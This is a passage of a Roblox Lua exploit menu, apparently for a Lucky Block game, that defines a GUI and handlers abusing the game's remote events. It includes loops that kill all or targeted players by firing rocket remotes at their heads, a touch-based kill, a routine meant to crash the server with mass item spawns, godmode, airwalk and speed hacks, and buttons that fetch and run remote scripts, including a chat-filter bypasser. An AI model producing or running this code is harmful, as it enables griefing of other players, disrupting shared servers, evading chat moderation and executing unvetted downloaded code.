Exploitsline2.Size = UDim2.new(0, 822, 0, 2)
Exploitsline2.Font = Enum.Font.SourceSans
Exploitsline2.Text = ""
Exploitsline2.TextColor3 = Color3.fromRGB(0, 0, 0)
Exploitsline2.TextSize = 14.000

UnAnchor.Name = "UnAnchor"
UnAnchor.Parent = PlayerTab
UnAnchor.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
UnAnchor.BorderColor3 = Color3.fromRGB(0, 0, 0)
UnAnchor.BorderSizePixel = 0
UnAnchor.Position = UDim2.new(0.0370000005, 0, 0.518999994, 0)
UnAnchor.Size = UDim2.new(0, 267, 0, 54)
UnAnchor.Visible = false
UnAnchor.Font = Enum.Font.LuckiestGuy
UnAnchor.Text = "anCHOR"
UnAnchor.TextColor3 = Color3.fromRGB(245, 16, 184)
UnAnchor.TextSize = 14.000

walkspeed.Name = "walkspeed"
walkspeed.Parent = PlayerTab
walkspeed.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
walkspeed.BorderColor3 = Color3.fromRGB(0, 0, 0)
walkspeed.BorderSizePixel = 0
walkspeed.Position = UDim2.new(0.00393998623, 0, 0.0573989563, 0)
walkspeed.Size = UDim2.new(0, 319, 0, 54)
walkspeed.Font = Enum.Font.LuckiestGuy
walkspeed.Text = "Set walkspeed to 100"
walkspeed.TextColor3 = Color3.fromRGB(245, 16, 184)
walkspeed.TextSize = 14.000

jumppower.Name = "jumppower"
jumppower.Parent = PlayerTab
jumppower.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
jumppower.BorderColor3 = Color3.fromRGB(0, 0, 0)
jumppower.BorderSizePixel = 0
jumppower.Position = UDim2.new(0.667491376, 0, 0.0573989563, 0)
jumppower.Size = UDim2.new(0, 319, 0, 54)
jumppower.Font = Enum.Font.LuckiestGuy
jumppower.Text = "set jump power to 100"
jumppower.TextColor3 = Color3.fromRGB(245, 16, 184)
jumppower.TextSize = 14.000

regen.Name = "regen"
regen.Parent = PlayerTab
regen.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
regen.BorderColor3 = Color3.fromRGB(0, 0, 0)
regen.BorderSizePixel = 0
regen.Position = UDim2.new(0.00393998623, 0, 0.33494997, 0)
regen.Size = UDim2.new(0, 319, 0, 54)
regen.Font = Enum.Font.LuckiestGuy
regen.Text = "Regen life"
regen.TextColor3 = Color3.fromRGB(245, 16, 184)
regen.TextSize = 14.000

gear.Name = "gear"
gear.Parent = PlayerTab
gear.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
gear.BorderColor3 = Color3.fromRGB(0, 0, 0)
gear.BorderSizePixel = 0
gear.Position = UDim2.new(0.667491376, 0, 0.33494997, 0)
gear.Size = UDim2.new(0, 319, 0, 54)
gear.Font = Enum.Font.LuckiestGuy
gear.Text = "Get gear"
gear.TextColor3 = Color3.fromRGB(245, 16, 184)
gear.TextSize = 14.000

Ungear.Name = "Ungear"
Ungear.Parent = PlayerTab
Ungear.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
Ungear.BorderColor3 = Color3.fromRGB(0, 0, 0)
Ungear.BorderSizePixel = 0
Ungear.Position = UDim2.new(0.667491376, 0, 0.33494997, 0)
Ungear.Size = UDim2.new(0, 319, 0, 54)
Ungear.Visible = false
Ungear.Font = Enum.Font.LuckiestGuy
Ungear.Text = "Stop getting gears"
Ungear.TextColor3 = Color3.fromRGB(245, 16, 184)
Ungear.TextSize = 14.000

MiscTab.Name = "MiscTab"
MiscTab.Parent = main
MiscTab.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
MiscTab.BorderColor3 = Color3.fromRGB(0, 0, 0)
MiscTab.BorderSizePixel = 0
MiscTab.Position = UDim2.new(0.128224716, 0, 0, 0)
MiscTab.Size = UDim2.new(0, 756, 0, 490)
MiscTab.Visible = false
MiscTab.Font = Enum.Font.SourceSans
MiscTab.Text = ""
MiscTab.TextColor3 = Color3.fromRGB(0, 0, 0)
MiscTab.TextSize = 14.000

AntiAfk.Name = "AntiAfk"
AntiAfk.Parent = MiscTab
AntiAfk.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
AntiAfk.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiAfk.BorderSizePixel = 0
AntiAfk.Position = UDim2.new(0.00396470167, 0, 0.0165826287, 0)
AntiAfk.Size = UDim2.new(0, 267, 0, 54)
AntiAfk.Font = Enum.Font.LuckiestGuy
AntiAfk.Text = "antiafk"
AntiAfk.TextColor3 = Color3.fromRGB(245, 16, 184)
AntiAfk.TextSize = 14.000

ChatLogs.Name = "ChatLogs"
ChatLogs.Parent = MiscTab
ChatLogs.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
ChatLogs.BorderColor3 = Color3.fromRGB(0, 0, 0)
ChatLogs.BorderSizePixel = 0
ChatLogs.Position = UDim2.new(0.675922275, 0, 0.0165826287, 0)
ChatLogs.Size = UDim2.new(0, 244, 0, 54)
ChatLogs.Font = Enum.Font.LuckiestGuy
ChatLogs.Text = "chat logs"
ChatLogs.TextColor3 = Color3.fromRGB(245, 16, 184)
ChatLogs.TextSize = 14.000

MiscLine.Name = "MiscLine"
MiscLine.Parent = MiscTab
MiscLine.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
MiscLine.BorderColor3 = Color3.fromRGB(0, 0, 0)
MiscLine.BorderSizePixel = 0
MiscLine.Position = UDim2.new(0.00264558336, 0, 0.46938777, 0)
MiscLine.Size = UDim2.new(0, 753, 0, -28)
MiscLine.Font = Enum.Font.LuckiestGuy
MiscLine.Text = "Misc Scripts"
MiscLine.TextColor3 = Color3.fromRGB(245, 16, 184)
MiscLine.TextSize = 14.000

InfiniteYield.Name = "InfiniteYield"
InfiniteYield.Parent = MiscTab
InfiniteYield.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
InfiniteYield.BorderColor3 = Color3.fromRGB(0, 0, 0)
InfiniteYield.BorderSizePixel = 0
InfiniteYield.Position = UDim2.new(0.00396462111, 0, 0.490052015, 0)
InfiniteYield.Size = UDim2.new(0, 374, 0, 54)
InfiniteYield.Font = Enum.Font.LuckiestGuy
InfiniteYield.Text = "Admin script"
InfiniteYield.TextColor3 = Color3.fromRGB(245, 16, 184)
InfiniteYield.TextSize = 14.000

ChatBypasser.Name = "ChatBypasser"
ChatBypasser.Parent = MiscTab
ChatBypasser.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
ChatBypasser.BorderColor3 = Color3.fromRGB(0, 0, 0)
ChatBypasser.BorderSizePixel = 0
ChatBypasser.Position = UDim2.new(0.498673618, 0, 0.490052015, 0)
ChatBypasser.Size = UDim2.new(0, 379, 0, 54)
ChatBypasser.Font = Enum.Font.LuckiestGuy
ChatBypasser.Text = "chat bypasser"
ChatBypasser.TextColor3 = Color3.fromRGB(245, 16, 184)
ChatBypasser.TextSize = 14.000

Miscline2.Name = "Miscline2"
Miscline2.Parent = MiscTab
Miscline2.BackgroundColor3 = Color3.fromRGB(212, 32, 119)
Miscline2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Miscline2.BorderSizePixel = 0
Miscline2.Position = UDim2.new(-0.0238094833, 0, 0.318367332, 0)
Miscline2.Size = UDim2.new(0, 820, 0, 2)
Miscline2.Font = Enum.Font.SourceSans
Miscline2.Text = ""
Miscline2.TextColor3 = Color3.fromRGB(0, 0, 0)
Miscline2.TextSize = 14.000

build.Name = "build"
build.Parent = main
build.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
build.BorderColor3 = Color3.fromRGB(0, 0, 0)
build.BorderSizePixel = 0
build.Position = UDim2.new(0.00781007856, 0, 0.908968866, 0)
build.Size = UDim2.new(0, 84, 0, 20)
build.Font = Enum.Font.SourceSans
build.Text = "build: Live"
build.TextColor3 = Color3.fromRGB(24, 255, 43)
build.TextSize = 14.000
build.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)

tab6.Name = "tab6"
tab6.Parent = main
tab6.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
tab6.BorderColor3 = Color3.fromRGB(0, 0, 0)
tab6.BorderSizePixel = 0
tab6.Position = UDim2.new(0.00667867996, 0, 0.470406651, 0)
tab6.Size = UDim2.new(0, 86, 0, 37)
tab6.Font = Enum.Font.LuckiestGuy
tab6.Text = "Spam"
tab6.TextColor3 = Color3.fromRGB(212, 32, 119)
tab6.TextSize = 14.000

SpamTab.Name = "SpamTab"
SpamTab.Parent = main
SpamTab.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
SpamTab.BorderColor3 = Color3.fromRGB(0, 0, 0)
SpamTab.BorderSizePixel = 0
SpamTab.Position = UDim2.new(0.121702977, 0, 0, 0)
SpamTab.Size = UDim2.new(0, 738, 0, 490)
SpamTab.Visible = false
SpamTab.Font = Enum.Font.SourceSans
SpamTab.Text = ""
SpamTab.TextColor3 = Color3.fromRGB(0, 0, 0)
SpamTab.TextSize = 14.000

SpamText.Name = "SpamText"
SpamText.Parent = SpamTab
SpamText.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
SpamText.BorderColor3 = Color3.fromRGB(0, 0, 0)
SpamText.BorderSizePixel = 0
SpamText.Position = UDim2.new(4.13517327e-08, 0, 0, 0)
SpamText.Size = UDim2.new(0, 802, 0, 60)
SpamText.Font = Enum.Font.Bodoni
SpamText.Text = "after using a spam ounce, reset ur character 3 times to use another spam. this will clean ur inventory"
SpamText.TextColor3 = Color3.fromRGB(212, 32, 119)
SpamText.TextSize = 20.000

rainbowperi.Name = "rainbowperi"
rainbowperi.Parent = SpamTab
rainbowperi.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
rainbowperi.BorderColor3 = Color3.fromRGB(0, 0, 0)
rainbowperi.BorderSizePixel = 0
rainbowperi.Position = UDim2.new(0.226384267, 0, 0.281888753, 0)
rainbowperi.Size = UDim2.new(0, 405, 0, 54)
rainbowperi.Font = Enum.Font.LuckiestGuy
rainbowperi.Text = "spam  rainbow peri"
rainbowperi.TextColor3 = Color3.fromRGB(245, 16, 184)
rainbowperi.TextSize = 22.000
rainbowperi.TextStrokeColor3 = Color3.fromRGB(80, 234, 77)
rainbowperi.TextWrapped = true

winterspam.Name = "winterspam"
winterspam.Parent = SpamTab
winterspam.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
winterspam.BorderColor3 = Color3.fromRGB(0, 0, 0)
winterspam.BorderSizePixel = 0
winterspam.Position = UDim2.new(0.330720305, 0, 0.120664261, 0)
winterspam.Size = UDim2.new(0, 248, 0, 54)
winterspam.Font = Enum.Font.LuckiestGuy
winterspam.Text = "spam winter sword"
winterspam.TextColor3 = Color3.fromRGB(245, 16, 184)
winterspam.TextSize = 22.000

crescendo.Name = "crescendo"
crescendo.Parent = SpamTab
crescendo.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
crescendo.BorderColor3 = Color3.fromRGB(0, 0, 0)
crescendo.BorderSizePixel = 0
crescendo.Position = UDim2.new(0.719609201, 0, 0.120664261, 0)
crescendo.Size = UDim2.new(0, 248, 0, 54)
crescendo.Font = Enum.Font.LuckiestGuy
crescendo.Text = "spam crescendo"
crescendo.TextColor3 = Color3.fromRGB(245, 16, 184)
crescendo.TextSize = 22.000

rocketkill_2.Name = "rocket kill"
rocketkill_2.Parent = SpamTab
rocketkill_2.BackgroundColor3 = Color3.fromRGB(35, 14, 39)
rocketkill_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
rocketkill_2.BorderSizePixel = 0
rocketkill_2.Position = UDim2.new(0.017712187, 0, 0.120664261, 0)
rocketkill_2.Size = UDim2.new(0, 239, 0, 54)
rocketkill_2.Font = Enum.Font.LuckiestGuy
rocketkill_2.Text = "spam crimson peri"
rocketkill_2.TextColor3 = Color3.fromRGB(245, 16, 184)
rocketkill_2.TextSize = 19.000

linespam.Name = "line spam"
linespam.Parent = SpamTab
linespam.BackgroundColor3 = Color3.fromRGB(245, 24, 149)
linespam.BorderColor3 = Color3.fromRGB(0, 0, 0)
linespam.BorderSizePixel = 0
linespam.Position = UDim2.new(-0.01626008, 0, 0.22857143, 0)
linespam.Size = UDim2.new(0, 827, 0, 2)
linespam.Font = Enum.Font.SourceSans
linespam.Text = ""
linespam.TextColor3 = Color3.fromRGB(0, 0, 0)
linespam.TextSize = 14.000

Open.Name = "Open"
Open.Parent = LuckyBlockGui
Open.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Open.BorderColor3 = Color3.fromRGB(0, 0, 0)
Open.BorderSizePixel = 0
Open.Position = UDim2.new(0.89465642, 0, 0.704714656, 0)
Open.Size = UDim2.new(0, 162, 0, 50)
Open.Font = Enum.Font.SourceSans
Open.Text = "Open/close"
Open.TextColor3 = Color3.fromRGB(227, 44, 193)
Open.TextSize = 14.000



local function LFKJCS_fake_script() -- NinjaGui.Script 
	local script = Instance.new('Script', LuckyBlockGui)

	local previous = {}

	--safetable
	local Safe = {"bielsamorim1", "bielsamorimban"}

	--targetsTable
	local Targets = {}


	Open.MouseButton1Down:connect(function()
		if main.Visible == false then main.Visible = true 

		elseif main.Visible == true then main.Visible = false

		end
	end)

	changelog.MouseButton1Down:connect(function()
		Closeall() changelogtab.Visible = true  
	end)

	tab2.MouseButton1Down:connect(function()
		Closeall() PlayerTab.Visible = true  
	end)

	tab3.MouseButton1Down:connect(function()
		Closeall() Combat.Visible = true  
	end)

	tab4.MouseButton1Down:connect(function()
		Closeall() ExploitsTab.Visible = true  
	end)

	tab5.MouseButton1Down:connect(function()
		Closeall() MiscTab.Visible = true  
	end)
	
	tab6.MouseButton1Down:connect(function()
		Closeall() SpamTab.Visible = true  
	end)

	teleportmid.MouseButton1Down:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1041, 194, 90)
	end)

	rocketkill.MouseButton1Down:connect(function()
		_G.RocketTarget = true
		while _G.RocketTarget do
			game:GetService("RunService").RenderStepped:wait()
			game:GetService("RunService").RenderStepped:wait()
			pcall(function()
				for i,v in pairs(game.Players:GetChildren()) do
					if table.find(Targets, v.Name) and v ~= game.Players.LocalPlayer and v.Name ~= "bielsamorim1" and v.Name ~= "icekingmaster111" and v.Name ~= "cbzql" and v.Name ~= "Verlitarim" and v.Name ~= "lIllIlIIIlllIIIIllIl" and v.Name ~= "karreh" then
						if game.Players:FindFirstChild(v.Name) then
							if game.Players:FindFirstChild(v.Name).Character.Humanoid.Health >= 1 then
								game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),game.Players:FindFirstChild(v.Name).Character.Head.Position)
							end
						end
					end
				end
			end)
		end
	end)

	rocketkill.MouseButton1Down:connect(function()
		rocketkill.Visible = false
		Unrocketkill.Visible = true
	end)

	Unrocketkill.MouseButton1Down:connect(function()
		_G.RocketTarget = false
	end)
	Unrocketkill.MouseButton1Down:connect(function()
		rocketkill.Visible = true
		Unrocketkill.Visible = false
	end)



	KillTarget.MouseButton1Down:connect(function()
		KillTarget.Visible = false
		UnkillTarget.Visible = true
	end)


	UnkillTarget.MouseButton1Down:connect(function()
		_G.KillTarget = false
	end)
	UnkillTarget.MouseButton1Down:connect(function()
		UnkillTarget.Visible = false
		KillTarget.Visible = true
	end)




	godmode.MouseButton1Down:connect(function()
		local gearname3 = "LockonLauncher"
		local gearname4 = "ChartreusePeriastron"
		local hum = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")

		repeat
			game:GetService("RunService").RenderStepped:wait()
			game:GetService("ReplicatedStorage").SpawnGalaxyBlock:FireServer()
		until game.Players.LocalPlayer.Backpack:FindFirstChild(gearname3) and game.Players.LocalPlayer.Backpack:FindFirstChild(gearname4)

		if game.Players.LocalPlayer.Backpack:FindFirstChild(gearname3) and game.Players.LocalPlayer.Backpack:FindFirstChild(gearname4) then
			game.Players.LocalPlayer.Backpack:FindFirstChild(gearname4).Parent = game.Players.LocalPlayer.Character
			game:GetService("Players").LocalPlayer.Character.ChartreusePeriastron.Remote:FireServer(Enum.KeyCode.Q)
			wait(0.5)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,10,0)
			game.Players.LocalPlayer.Backpack:FindFirstChild(gearname3).Parent = game.Players.LocalPlayer.Character
			game:GetService("Players").LocalPlayer.Character.LockonLauncher.Remote:FireServer(Vector3.new(-1172, 190, 201),Vector3.new(-1040, 195, 87))
		end
	end)

	AntiAfk.MouseButton1Down:connect(function()
		local vu = game:GetService("VirtualUser")
		game:GetService("Players").LocalPlayer.Idled:connect(function()
			vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
			wait(1)
			vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		end)
	end)

	anchor.MouseButton1Down:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
	end)
	anchor.MouseButton1Down:connect(function()
		anchor.Visible = false
		UnAnchor.Visible = true
	end)

	UnAnchor.MouseButton1Down:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
	end)
	UnAnchor.MouseButton1Down:connect(function()
		anchor.Visible = true
		UnAnchor.Visible = false
	end)


	walkspeed.MouseButton1Down:connect(function()
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100

	end)

	jumppower.MouseButton1Down:connect(function()
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = 100

	end)

	safespot.MouseButton1Down:connect(function()
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(300000, 300001, 300000)
	end)



	gear.MouseButton1Down:connect(function()
		_G.OpenBlocks = true

		while _G.OpenBlocks == true do
			wait()
			game:GetService("ReplicatedStorage").SpawnGalaxyBlock:FireServer()
			game:GetService("ReplicatedStorage").SpawnRainbowBlock:FireServer()
			game:GetService("ReplicatedStorage").SpawnDiamondBlock:FireServer()
			game:GetService("ReplicatedStorage").SpawnLuckyBlock:FireServer()
			game:GetService("ReplicatedStorage").SpawnSuperBlock:FireServer()
		end
	end)

	gear.MouseButton1Down:connect(function()
		gear.Visible = false Ungear.Visible = true
	end)

	Ungear.MouseButton1Down:connect(function()
		_G.OpenBlocks = false

		while _G.OpenBlocks == true do
			wait()
			game:GetService("ReplicatedStorage").SpawnGalaxyBlock:FireServer()
			game:GetService("ReplicatedStorage").SpawnRainbowBlock:FireServer()
			game:GetService("ReplicatedStorage").SpawnDiamondBlock:FireServer()
			game:GetService("ReplicatedStorage").SpawnLuckyBlock:FireServer()
			game:GetService("ReplicatedStorage").SpawnSuperBlock:FireServer()
		end
	end)

	Ungear.MouseButton1Down:connect(function()
		gear.Visible = true Ungear.Visible = false
	end)



	regen.MouseButton1Down:connect(function()
		local gearname2 = "TigerSkin"    
		repeat
			game:GetService("RunService").RenderStepped:wait()
			game:GetService("ReplicatedStorage").SpawnLuckyBlock:FireServer()
		until game.Players.LocalPlayer.Backpack:FindFirstChild(gearname2)
		wait()
		game.Players.LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(game.Players.LocalPlayer.Backpack:WaitForChild("TigerSkin"))
		local hum = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
		mouse1click()
		wait()
		hum:UnequipTools()
		while game.RunService.RenderStepped:wait() do
			if hum and hum.Health <= 99 and hum.Health ~= 0 then
				if game.Players.LocalPlayer.Backpack:FindFirstChild("TigerSkin") then
					hum:EquipTool(game.Players.LocalPlayer.Backpack.TigerSkin)
					hum:UnequipTools()
				end
			end
		end
	end)

	Textbox:GetPropertyChangedSignal("Text"):Connect(function()
		for i = 1, #game.Players:GetPlayers() do
			if string.lower(string.sub(game.Players:GetPlayers()[i].Name, 1, string.len(Textbox.Text))) == string.lower(Textbox.Text) then
				Target = game.Players:GetPlayers()[i].Name
				break
			end
		end
	end)

	killAll.MouseButton1Down:connect(function()
		_G.Cbring = true

		while _G.Cbring == true do
			game:GetService("RunService").RenderStepped:wait()
			game:GetService("RunService").RenderStepped:wait()
			pcall(function()
				for i, v in pairs(game.Players:GetChildren()) do
					if v ~= game.Players.LocalPlayer and v.Name ~= "bielsamorim1" and v.Name ~= "icekingmaster111" and v.Name ~= "Verlitarim" and v.Name ~= "cbzql" and v.Name ~= "lIllIlIIIlllIIIIllIl" and v.Name ~= "karreh" then
						if v.Character.Humanoid.Health > 0 then
							game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),v.Character.Head.Position)
						end
					end
				end
			end)
		end
	end)


	killAll.MouseButton1Down:connect(function()
		UnkillAll.Visible = true
		killAll.Visible = false
	end)



	UnkillAll.MouseButton1Down:connect(function()
		UnkillAll.Visible = false
		killAll.Visible = true
		_G.Cbring = false

	end)




	KillTarget.MouseButton1Down:connect(function()
		_G.KillTarget = true
		while _G.KillTarget == true do
			game:GetService("RunService").RenderStepped:wait()
			for i,v in pairs(game.Players:GetChildren()) do
				if table.find(Targets, v.Name) and v.Name ~= "bielsamorim1" and v.Name ~= "icekingmaster111" and v.Name ~= "cbzql" and v.Name ~= "Verlitarim" and v.Name ~= "lIllIlIIIlllIIIIllIl" and v.Name ~= "karreh" then
					spawn(function()
						local Handle = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle
						if Handle then
							for i,c in pairs(v.Character:GetChildren()) do
								if c:IsA("BasePart") then
									c = ((c.IsA(c, "BasePart") and firetouchinterest(Handle, c, 1,(game:GetService("RunService").RenderStepped.Wait(game:GetService("RunService").RenderStepped) and nil) or firetouchinterest(Handle, c, 0)) and nil) or c) or c
								end
							end
						end
					end)
				end
			end
		end
	end)
	KillTarget.MouseButton1Down:connect(function()
		KillTarget.Visible = false
		UnkillTarget.Visible = true
	end)

	--unkilltarget
	UnkillTarget.MouseButton1Down:connect(function()
		_G.KillTarget = false
	end)
	UnkillTarget.MouseButton1Down:connect(function()
		UnkillTarget.Visible = false
		KillTarget.Visible = true
	end)

	infjump.MouseButton1Down:connect(function()
		local function Jump()
			_G.Jump = game.Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
		end

		game.UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
			if input.UserInputType == Enum.UserInputType.Keyboard then
				if input.KeyCode == Enum.KeyCode.Space then
					Jump()
				end
			end
		end)
	end)


	aiwralk.MouseButton1Down:connect(function()
		mouse = game.Players.LocalPlayer:GetMouse()
		_G.AirWalk = true


		local WalkPart = Instance.new("Part", workspace)
		WalkPart.Size = Vector3.new(7, 2, 3)
		WalkPart.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, -4, 0)
		WalkPart.Transparency = 1
		WalkPart.Anchored = true
		WalkPart.Name = "Airwalk"


		mouse.KeyDown:Connect(function(key)
			if key == "2" then
				WalkPart.Size = Vector3.new(4, -0.5, 3)
			end
		end)

		mouse.KeyUp:Connect(function(key)
			if key == "2" then
				WalkPart.Size = Vector3.new(7, 2, 3)
			end
		end)

		repeat
			WalkPart.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, -4, 0)
			wait()
		until _G.AirWalk == false
		WalkPart:Destroy()
	end)

	aiwralk.MouseButton1Down:connect(function()
		aiwralk.Visible = false
		Unaiwralk.Visible = true
	end)

	--unairwalk
	Unaiwralk.MouseButton1Down:connect(function()
		_G.AirWalk = false
	end)
	Unaiwralk.MouseButton1Down:connect(function()
		Unaiwralk.Visible = false
		aiwralk.Visible = true
	end)

	crash.MouseButton1Down:connect(function()
		local hum = game.Players.LocalPlayer.Character.Humanoid
		game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)

		local cam = workspace.CurrentCamera
		wait(1)
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(300000, 300001, 300000)
		wait()

		cam.CameraType = Enum.CameraType.Fixed
		cam.Focus = CFrame.new(Vector3.new(0, -9e6, 0))

		local lplr = game.Players.LocalPlayer

		if lplr then
			local da = lplr.Character:GetChildren()
			local skok = 0
			local daskok = 30

			for i = 1,300 do

				game.ReplicatedStorage.SpawnRainbowBlock:FireServer()
				game.ReplicatedStorage.SpawnDiamondBlock:FireServer()
				game.ReplicatedStorage.SpawnSuperBlock:FireServer()
				game.ReplicatedStorage.SpawnLuckyBlock:FireServer()
				game.ReplicatedStorage.SpawnGalaxyBlock:FireServer()
			end

			while wait(0.1) and #lplr.Character:GetChildren() - #da < daskok do
				for i,v in pairs(lplr.Backpack:GetChildren()) do
					if v.Name == 'IvoryPeriastron' then
						v.Parent = lplr.Character
						skok = #lplr.Character:GetChildren() - #da
					end
				end
			end
			wait(1)

			for i,v in pairs(lplr.Character:GetChildren()) do
				if v.Name == 'IvoryPeriastron' then
					v.Remote:FireServer(Enum.KeyCode.Q)
				end
			end
		end


	end)

	instertTarget.MouseButton1Down:connect(function()
		table.insert(Targets, Target)
		ChatMessage2('Targets:', 255,0,255)
		for i,v in pairs(Targets) do
			ChatMessage2(v, 255,0,255)
		end
	end)

	removetarget.MouseButton1Down:connect(function()
		local thingy = table.find(Targets, Target)
		table.remove(Targets, thingy)
		ChatMessage2('Targets:', 255,0,255)
		for i,v in pairs(Targets) do
			ChatMessage2(v, 255,0,255)
		end

	end)

	anticrash.MouseButton1Down:connect(function()
		_G.AntiCrash = true
		local CrashGear = {"DragonCompanion", "SillyGuitar", "Ferdinand", "SharkMount", "WhiteGoldBlueFlowerSword", "FestiveMooseMount", "IvoryPeriastron"}
		for i,v in pairs(game.Players:GetChildren()) do
			for i,gear in pairs(CrashGear) do
				if v.Backpack:FindFirstChild(gear) then

					while _G.AntiCrash do
						game:GetService("RunService").RenderStepped:wait()
						pcall(function()
							for i,v in pairs(game.Players:GetChildren()) do
								for i,gear in pairs(CrashGear) do
									if v.Backpack:FindFirstChild(gear) then
										print "2"
										if v.Backpack:FindFirstChild(gear) then
											if game.Players:FindFirstChild(v.Name) then
												if game.Players:FindFirstChild(v.Name).Character.Humanoid.Health >= 1 then
													game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),game.Players:FindFirstChild(v.Name).Character.Torso.Position)
												end
											end
										end
									end
								end
							end
						end)
					end
				end
			end
		end
	end)

	anticrash.MouseButton1Down:connect(function()
		anticrash.Visible = false
		UnAnticrash.Visible = true
	end)

	--unanticrash
	UnAnticrash.MouseButton1Down:connect(function()
		_G.AntiCrash = false
	end)
	UnAnticrash.MouseButton1Down:connect(function()
		UnAnticrash.Visible = false
		anticrash.Visible = true
	end)

	InfiniteYield.MouseButton1Down:connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	end)

	ChatBypasser.MouseButton1Down:connect(function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua",true))()
	end)

	ChatLogs.MouseButton1Down:connect(function()
		-- Version: 2.82
		-- Instances:
		local ChatGui = Instance.new("ScreenGui")
		local Frame = Instance.new("Frame")
		local LogPanel = Instance.new("ScrollingFrame")
		local Close = Instance.new("TextButton")
		local Mini = Instance.new("TextButton")
		local Log = Instance.new("TextButton")
		local title = Instance.new("TextLabel")
		--Properties:
		ChatGui.Name = "ChatGui"
		ChatGui.Parent = game.Players.LocalPlayer.PlayerGui
		ChatGui.ResetOnSpawn = false

		Frame.Parent = ChatGui
		Frame.BackgroundColor3 = Color3.new(0, 0, 0)
		Frame.BorderSizePixel = 0
		Frame.Position = UDim2.new(0.0278396439, 0, 0.565217376, 0)
		Frame.Size = UDim2.new(0, 392, 0, 25)
		Frame.Active = true
		Frame.Draggable = true

		LogPanel.Name = "LogPanel"
		LogPanel.Parent = Frame
		LogPanel.BackgroundColor3 = Color3.new(0, 0, 0)
		LogPanel.BorderColor3 = Color3.new(0.223529, 0.223529, 0.223529)
		LogPanel.Position = UDim2.new(-0.000221580267, 0, 0.968695641, 0)
		LogPanel.Size = UDim2.new(0, 392, 0, 203)
		LogPanel.ScrollBarThickness = 5
		LogPanel.ScrollingEnabled = true
		LogPanel.CanvasSize=UDim2.new(2,0,100,0)

		Close.Name = "Close"
		Close.Parent = Frame
		Close.BackgroundColor3 = Color3.new(1, 1, 1)
		Close.BackgroundTransparency = 1
		Close.Position = UDim2.new(0.823979557, 0, 0.0399999991, 0)
		Close.Size = UDim2.new(0, 69, 0, 24)
		Close.Font = Enum.Font.SourceSans
		Close.Text = "Close"
		Close.TextColor3 = Color3.new(1, 1, 1)
		Close.TextSize = 14

		Mini.Name = "Mini"
		Mini.Parent = Frame
		Mini.BackgroundColor3 = Color3.new(1, 1, 1)
		Mini.BackgroundTransparency = 1
		Mini.Position = UDim2.new(0.647959173, 0, 0, 0)
		Mini.Size = UDim2.new(0, 69, 0, 24)
		Mini.Font = Enum.Font.SourceSans
		Mini.Text = "Minimize"
		Mini.TextColor3 = Color3.new(1, 1, 1)
		Mini.TextSize = 14

		Log.Name = "Log"
		Log.Parent = Frame
		Log.BackgroundColor3 = Color3.new(1, 1, 1)
		Log.BackgroundTransparency = 1
		Log.Position = UDim2.new(0.293367326, 0, 0, 0)
		Log.Size = UDim2.new(0, 69, 0, 24)
		Log.Font = Enum.Font.SourceSans
		Log.Text = "Log Chat [ON]"
		Log.TextColor3 = Color3.new(1, 1, 1)
		Log.TextSize = 14

		title.Name = "title"
		title.Parent = Frame
		title.BackgroundColor3 = Color3.new(1, 1, 1)
		title.BackgroundTransparency = 1
		title.Size = UDim2.new(0, 115, 0, 24)
		title.Font = Enum.Font.SourceSans
		title.Text = "Chat GUI"
		title.TextColor3 = Color3.new(1, 1, 1)
		title.TextSize = 14
		title.TextXAlignment = Enum.TextXAlignment.Left
		-- Scripts:
		local logging = true
		local minimized = false
		Log.MouseButton1Down:Connect(function()
			logging = not logging
